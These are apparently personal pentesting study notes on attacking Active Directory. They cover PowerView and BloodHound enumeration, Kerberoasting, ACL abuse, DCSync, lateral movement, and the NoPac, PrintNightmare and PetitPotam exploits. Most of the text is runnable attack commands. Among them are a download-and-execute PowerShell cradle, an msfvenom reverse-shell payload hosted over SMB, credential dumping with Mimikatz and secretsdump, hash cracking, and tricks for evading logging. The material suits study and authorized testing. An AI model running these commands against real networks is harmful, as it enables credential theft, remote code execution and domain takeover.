| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

PowerView is now deprecated and moved to [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework. SharpView is a C# port of PowerView that works similarly.
##### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool to acquire a whole lot of credentials:
```PowerShell
.\Snaffler.exe  -d <domain> -s -v data -o snaffler.log
# -s prints to console
# -v specifies verbosity
```
### Enumerating with Native Tools
**Basic Enumeration**

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
**Basic PowerShell Commandlets** 

| **Cmd-Let**                                                                                                                                                                        | **Description**                                                                                                                                                                                                                               |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                                                                                       | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                                                                        | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                                                                        | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                                                                               | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env: APPDATA\Microsoft\Windows \Powershell\PSReadline\ ConsoleHost_history.txt`<br><br>Note that spaces have been added to this command to help better fit the table | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`                                                         | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

Often times, defenders don't realize that there are multiple versions of PowerShell on a host. If they aren't uninstalled, they can be used; this is important since tracking only happens for PS 3.0 and onward. Here's how to do so:
```PowerShell
Get-host # Get PS Version
powershell.exe -version 2 # Change version
```
**Checking Defenses**
```PowerShell
# Firewall
netsh advfirewall show allprofiles

# Check defender from CMD
sc query windefend

# All defenses
Get-MpComputerStatus

# Checking who's logged on (make sure it's only you)
qwinsta
```
**Check Network Information**
```PowerShell
# List arp table and known hosts
arp -a

# List adapter settings
ipconfig /all

# Display routing table
route print
```
**WMI Scripting Engine**
```PowerShell
# Print patch level and hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Display basic host info
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# List all processes
wmic process list /format:list

# List info about domains and domain constrollers
wmic ntdomain list /format:list

# List local account and domain accounts logged into device
wmic useraccount list /format:list

# List all local groups
wmic group list /format:list

# Dump information about system accounts being used as service accounts
wmic sysaccount list /format:list
```
Useful: [WMI Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)  and [WMI Docs](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)

**Net Commands**

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |
Useful: [Docs](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2). Also typing `net1` instead of just `net` executes the same command, but may get around some filters or logging.

**Dsquery**
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is used to find AD objects. These queries can replace `BloodHound` and `PowerView`. It requires admin privileges and exists on any host with an `Active Directory Domain Services Role` installed. It's found at `C:\Windows\System32\dsquery.dll`.
```PowerShell
# Get user info
dsquery user

# Get computer info
dsquery computer

# Wildcard query for all objects in an OU
dsquery * "CN=Users,DC=<Domain>,DC=LOCAL"

# Users with attribute in userAccountControl set
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Find domain controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Notice that the above queries use specific terms in their queries. `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties). These objects have different values that identify them (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/). 
![[Pasted image 20241206200007.png]]

Useful: [LDAP Attributes](https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html)
# Bloodhound
This is one of the best tools for AD audits. It's actually so good that it deserves its own section. It'll take massive amounts of data and create graphical representations of it, letting us see attack paths. It consists of two parts: [`SharpHound collector`](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows or `BloodHound.py collector` for use on Linux, and [`BloodHound`](https://github.com/BloodHoundAD/BloodHound/releases)GUI. After uploading collected `.json` files, we can run prebuilt queries or write custom queries using [`Cypher language`](https://blog.cptjesus.com/posts/introtocypher). 

Collecting on Linux:
```shell
sudo bloodhound-python -u '<user>' -p '<pass>' -ns <IP> -d <domain> -c all
# Use -c or --collectionmethod to specify which data to retrieve
```
Starting the GUI:
```shell
sudo neo4j start
bloodhound # this will start the GUI, then we can upload individually or by zip
```
Collecting on Windows:
```PowerShell
.\SharpHound.exe -c All --zipfilename <out file>
```

Here's a useful [cheatsheet](https://redfoxsec.com/blog/bloodhound-cheat-sheet/) for queries.
##### Enumerating ACLs
Start at the user we have access to for our first node. Select `Node Info` and go to `Outbound Control Rights` to see which objects we have control over and the number of objects our user can lead to via ACL paths under `Transitive Object Control`. 

Clicking on number next to `First Degree Object Control`, we can see the first set of rights that can be enumerated. Clicking on the lines between the two object gives a menu, where selecting help tells us how we can abuse the ACE. Clicking on the number next to `Transitive Object Control` gives us the entire attack path.
# Kerberoasting
Lateral movement and privesc technique in AD environments. It targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts, which Kerberos uses to map service instances to service accounts. Domain accounts are used to run services to overcome authentication of built in accounts. 

Any domain user can request a Kerberos ticket for any service account in the same domain. It's also possible across forest trusts depending on the environment. All that's needed is an account's NTLM hash or password, and a shell in the context of the domain user. We can also just have SYSTEM level access on a domain joined host.

Most service accounts are granted admin access on different systems. This is because services often require elevated privileges. These accounts can also be added to privileged groups, such as Domain Admin. 

Getting a Kerberos ticket for an account with an SPN doesn't allow to execute commands on behalf of the account, but the ticket (TGS-REP) is encrypted using the service account's NTLM hash, so the cleartext password can possibly be cracked. Accounts with weak or reused passwords are common since they simplify administration, so it's not uncommon to see this.

Here's where we can perform the attack from:
- Non-domain joined Linux host with valid domain user credentials
- Domain joined Linux host as root after retrieving the keytab file
- From a domain joined Windows host authenticated as a domain user
- From a domain joined Windows host with a shell of a domain user
- As SYSTEM on a domain joined Windows host
- From a non-domain joined Windows host using [`runas`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) with the option `/netonly`

Here's some tools we can use:
- [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host
- A combination of `setspn.exe` (it's built-in to Windows), PowerShell, and `Mimikatz`
- From Windows using `PowerView`, [`Rubeus`](https://github.com/GhostPack/Rubeus), and a few scripts.

Note that after we obtain a TGS ticket, it doesn't guarantee that we can crack the password or get an account that has the privileges we want. TGS tickets also take longer to crack than other formats as well.
### Kerberoasting From Linux
For this, we'll be using `GetUserSPNs.py`, which is a tool from [`Impacket`](https://github.com/SecureAuthCorp/impacket). Here's how we can use it:
```shell
# List Users
GetUserSPNs.py -dc-ip <Domain controller> <Domain>/<Domain user>

# Request all tickets
GetUserSPNs.py -dc-ip <Domain controller> <Domain>/<Domain user> -request

# Request one user
GetUserSPNs.py -dc-ip <Domain controller> <Domain>/<Domain user> -request-user <user>

# To save data to an output file, use -outputfile <filename>
# Hashcat quick reference
hashcat -m 13100 <hash> <wordlist>
```
### Kerberoasting From Windows
There's a more manual way to do it using a built-in binary called [`setspn`](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)):
```PowerShell
# Getting SPNs
setspn.exe -Q */*

# Request ticket of single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"

# Retrieve all tickets of accounts with SPNs set and load into memory
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Dump from memory using Mimikatz
mimikatz.exe
base64 /out:true # Write the hashes to base64 in the terminal, otherwise it'll be .kirbi files
kerberos::list /export
```
From here we can simply crack on our Linux machine using [`kirbi2john`](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) and `hashcat`:
```shell
# Create a .kirbi file to crack
echo "<base64>" |  tr -d \\n  | base64 -d > out.kirbi

# Extracting using kirbi2john (it'll go to crack_file)
python2.7 kirbi2john.py sqldev.kirbi

# Modifying the crack file for use on hashcat (Convert it to a ticket)
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > outfile

# Crack with hashcat 
hashcat -m 13100 <file> <wordlist>
```
There's also an automated way we can grab tickets. First with [`PowerView`](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1):
```PowerShell
# Find TGS tickets
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# Target a user
Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat

# Export all tickets to .csv
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<out>.csv -NoTypeInformation

# Check supported encryption types (if it's a 0, default is RC4)
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
There's also [`Rubeus`](https://github.com/GhostPack/Rubeus) for exporting tickets:
```PowerShell
# Get options
.\Rubeus.exe

# Show the list of kerberoastable users
.\Rubeus.exe kerberoast /stats

# Get hashes with admincount set to 1
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Target a user
.\Rubeus.exe kerberoast /user:<user> /nowrap\
# Use the /tgtdeleg to reuest for RC4 only tickets
```
Note that Kerberoasting tools usually request `RC4` hashes since they're easier to crack. Hashes that begin with `$krb5tgs$23$*` are `RC4`, whereas hashes that begin with `$krb5tgs$18$*` are `AES-256`. 

Here's how we can crack `AES` with `hashcat`:
```shell
hashcat -m 19700 <file> <wordlist>
```
# Access Control Lists
ACLs define who has access to which resource and what level of access they're given. Each entry in an ACL is called an Access Control Entry. It maps a user, group, or process and defines rights granted to a principal. Every object has an ACL, but can have multiple ACEs.

There are two types of ACL:
1. Discretionary ACLs: define which security principals are granted or denied access to an object. When someone goes to access an object, the system checks the DACL to see if they're permitted. If a DACL exists for an object but there are no entries, the system denies all access.
2. System ACLs: These allow administrators to log access attempts made to secure objects.

Types of ACE:

|**ACE**|**Description**|
|---|---|
|`Access denied ACE`|Used within a DACL to show that a user or group is explicitly denied access to an object|
|`Access allowed ACE`|Used within a DACL to show that a user or group is explicitly granted access to an object|
|`System audit ACE`|Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|
Components of ACEs:

| Component                                                                                                                                      | Description                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `SID`                                                                                                                                          | User or group that has access to the object.                                                               |
| `Flag`                                                                                                                                         | Type of ACE.                                                                                               |
| `Flag Set`                                                                                                                                     | Specifies whether or not child containers or objects can inherit ACE entry from primary or parent objects. |
| [`Access Mask`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) | 32 bit value that defines access rights.                                                                   |
### Enumerating ACLs
**Using PowerView**
```PowerShell
# Gets all interesting domain ACLs (produces too much data to really use)
Find-InterestingDomainAcl

# Convert username to SID for use
$sid = Convert-NameToSid <user>

# Get all domain objects a user has rights to
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

# Resolve a GUID to a domain object
$guid= "<object>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
**Using Windows Native Tools**
```PowerShell
# Get all AD users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Get access rights of all users in control of a specific user
foreach($line in [System.IO.File]::ReadLines("<file path>")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<domain>\\<user>'}}

# After this, we can resolve GUID the same as above, then further enumerate accounts and objects

# Investigate group nesting
Get-DomainGroup -Identity "<group name>" | select memberof
```
### Specific ACE Attacks
![[Pasted image 20241210125811.png]]

**`ForceChangePassword`**
This gives us the right to reset a user's password without knowing their password. Note that this is destructive.
```PowerShell
# Create a PSCredential object for our user
$SecPassword = ConvertTo-SecureString '<user pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<our user>', $SecPassword) 

# Create secure string object for the user we intend to change
$newPassword = ConvertTo-SecureString '<new pass>' -AsPlainText -Force

# Change the password using PowerView
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity <user> -AccountPassword $newPassword -Credential $Cred -Verbose
```
**`GenericWrite`**
Allows us to write to any unprotected attribute on an object. If we have access over a user, we can give them an SPN and perform a Kerberoasting attack. If it's over a group, we can add ourselves to that group or another security principle to the given group. Lastly, if this is over a machine, we can perform a resource based delegation attack.
```PowerShell
# Setting a fakse SPN
Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
From here we just Kerberoast the user.

**`AddSelf`**
These are the security groups we can add ourselves to.

**`GenericAll`**
Grants full owner over an object. Same attacks as `ForceChangePassword` and `GenericWrite`. If LAPS is used in the environment, we can read the LAPS password and get local admin access on the machine.

**Important**
Make sure to clean up after each attack. Any changes that were made should be undone.
### DCSync
DCSync allows us to steal the AD password database by using the built-in `Directory Replication Service Remote Protocol`. This is used by DCs to replicate data. We'll need to replicate data with the `DS-Replication-Get-Changes-All` extended right, enabled by default for Domain and Enterprise Admins.
```PowerShell
# Check domain membership
Get-DomainUser -Identity <user>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

# Check rights
$sid = "<user sid>"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# Extract NTLM Hashes and keys from Linux using credentials
secretsdump.py -outputfile <filename> -just-dc <domain>/<user>@<Domain controller>
# -just-dc-ntlm for only NTLM hashes
# -just-dc-user <user> for a specific user
# -user-status helps to see if users are disabled too
```
This attack can also be done with `Mimikatz`
```PowerShell
# Get a shell in the context of the admin user
runas /netonly /user:<domain>\<user> powershell

# Dump hashes
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:<domain> /user:<domain>\administrator

```
# Lateral Movement
See also [[Tunnels and Portforwarding]]

Here's some common options for lateral movement:
1. RDP
2. Windows Remote Management
3. SQL Server
```PowerShell
# Check RDP privs for a machine
Get-NetLocalGroupMember -ComputerName <machine> -GroupName "Remote Desktop Users"
# Use mstsc.exe to RDP

# Check WinRM Rights
Get-NetLocalGroupMember -ComputerName <machine> -GroupName "Remote Management Users"

# Establish WinRM Session
$password = ConvertTo-SecureString "<pass>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<domain>\<user>", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

# From Linux, use evil-winrm
evil-winrm -i <host> -u <user>

# Finding MSSQL instances
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

# Connect to SQL instance
Get-SQLQuery -Verbose -Instance "IP,port" -username "<domain>\<user>" -password "<pass>" -query 'Select @@version'

# On Linux
mssqlclient.py <domain>/<user>@<IP> -windows-auth

# From here we can use enable_xp_cmdshell to allow for remote access
```
[`PowerUpSQL cheatsheet`](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
[`xp_cmdshell stored procedure`](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)

All of this can also be checked in BloodHound:
```shell
# To check for RDP rights, go to the node info for a machine
# Also go to analysis and run the prebuilt queries regarding RDP

# Cypher query for WinRM
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# Check for SQL Admin rights
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

**Kerberos Double Hop Problem**
This problem occurs when attempting to use Kerberos for more than two hops with `WinRM` and `PowerShell`. This causes issues with lateral movement and accessing file shares. It stems from not have the user's password being cached as part of the login with `WinRM`

Workarounds can be found [here](https://posts.slayerlabs.com/double-hop/).
### Bleeding Edge Vulnerabilities
These are vulnerabilities that were recent in 2021-2022. We should be staying on top of recent attacks and tools.

**`NoPac (SamAccountName Spoofing)`**
Read into it [here](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699). It utilizes two CVEs: [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287). The former is bypass for SAM, the latter a vulnerability within the `Kerberos Privilege Attribute Certificate (PAC)`. Here's the control flow of the attack:
1. Add a computer to the domain and change the name of the new host to match a DCs `SamAccountName`
2. Request Kerberos tickets causing the service to give us tickets under the DC's name instead of the new name
3. When a TGS is granted, it'll issue the ticket with the closest matching name
4. Now we'll have access, and that service can even contain a SYSTEM shell on a DC.

Read more into the control flow [here](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware). We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.
```shell
# Ensure that we have both impacket and nopac
# Scan for nopac
sudo python3 scanner.py <domain>/<user>:<pass> -dc-ip 172.16.5.5 -use-ldap

# nopac shell
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip 172.16.5.5  -dc-host <DC Name> -shell --impersonate administrator -use-ldap

# DCSync with nopac
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip 172.16.5.5  -dc-host <DC Name> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
```
**`PrintNightmare`**
`PrintNightmare` is the nickname given to two vulnerabilities ([`CVE-2021-34527`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [`CVE-2021-1675`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [`Print Spooler service`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) . It runs on all Windows machines. Here's how we can use the exploit for RCE:
```shell
# Once again ensure that we have impacket installed prior to this
git clone https://github.com/cube0x0/CVE-2021-1675.git

# Enumerate for MS-RPRN
rpcdump.py @<DC IP> | egrep 'MS-RPRN|MS-PAR'

# Generate a payload (any reverse shell will work)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 -f dll > backupscript.dll

# Create a share to host the payload
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Run the exploit
sudo python3 CVE-2021-1675.py <domain>/<user>:<pass> '\\<local>\<share path>\<exploit>.dll'
```
**`PetitPotam`**
`PetitPotam` ([`CVE-2021-36942`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an `LSA Spoofing` vulnerability. It allows an unauthenticated attacker to coerce a DC into authenticating to another host using NTLM over SMB via [`Local Security Authority Remote Protocol (LSARPC)`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [`Encrypting File System Remote Protocol (MS-EFSRPC)`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). It required Active Directory Certificate Services to be in use. 

Read more about the attack [here](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/). We'll need to know the web enrollment URL of our CA host. Use [`certi`](https://github.com/zer1t0/certi) to find it if it's unknown. We'll also need the exploit script from [here](https://github.com/topotam/PetitPotam).
```shell
# For this attack, we'll need ntlmrelayx.py from impacket
sudo ntlmrelayx.py -debug -smb2support --target <web enrollment url of CA host> --adcs --template DomainController

# Run the exploit in another session
python3 PetitPotam.py <local IP> <DC IP>

# In the first terminal, we should get a B64 cert, use it here:
python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<DC Name>\$ -pfx-base64 <cert> dc01.ccache

# Use TGT
export KRB5CCNAME=dc01.ccache

# We can now perform a DCSync attack
secretsdump.py -just-dc -k -no-pass "<DC Name>$"@<DC Name>.<Domain>
```
# Domain Trusts
A domain trust establishes forest-forest or domain-domain authentication. It's usually used to make acquisitions smoother. It allows users to access or manage resources in other domains through creating a link between the authentication systems of both domains. This link can be either uni or bidirectional. Types of trusts:
- `Parent-child`: two or more domains within the same forest. Child has bidirectional trust with parent domain.
- `Cross-link`: Trust between child domains.
- `External`: Non-transitive trust between two separate domains in separate forests that aren't joined by a forest trust. Utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) for requests.
- `Tree-root`:  Bidirectional transitive trust between forest root domain and a new tree root domain. Created by design when a new tree root domain is setup within a forest.
- `Forest`: Transitive trust between two forest root domains.
- [`ESAE`](https://docs.microsoft.com/en-us/security/compass/esae-retirement): Bastion forest used to manage AD.

`Transitive trust` means that trust is extended to objects that the child domain trusts. In `non-transitive trust`, only the child domain itself is trusted.
### Enumerating Trusts
We can use [`Get-ADTrust`](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) to help enumerate:
```PowerShell
Import-Module activedirectory
Get-ADTrust -Filter *
```

### Attacking Parent Child Trusts
### Attacking Cross Domain Trusts


---
Navigation: [[Pentesting]]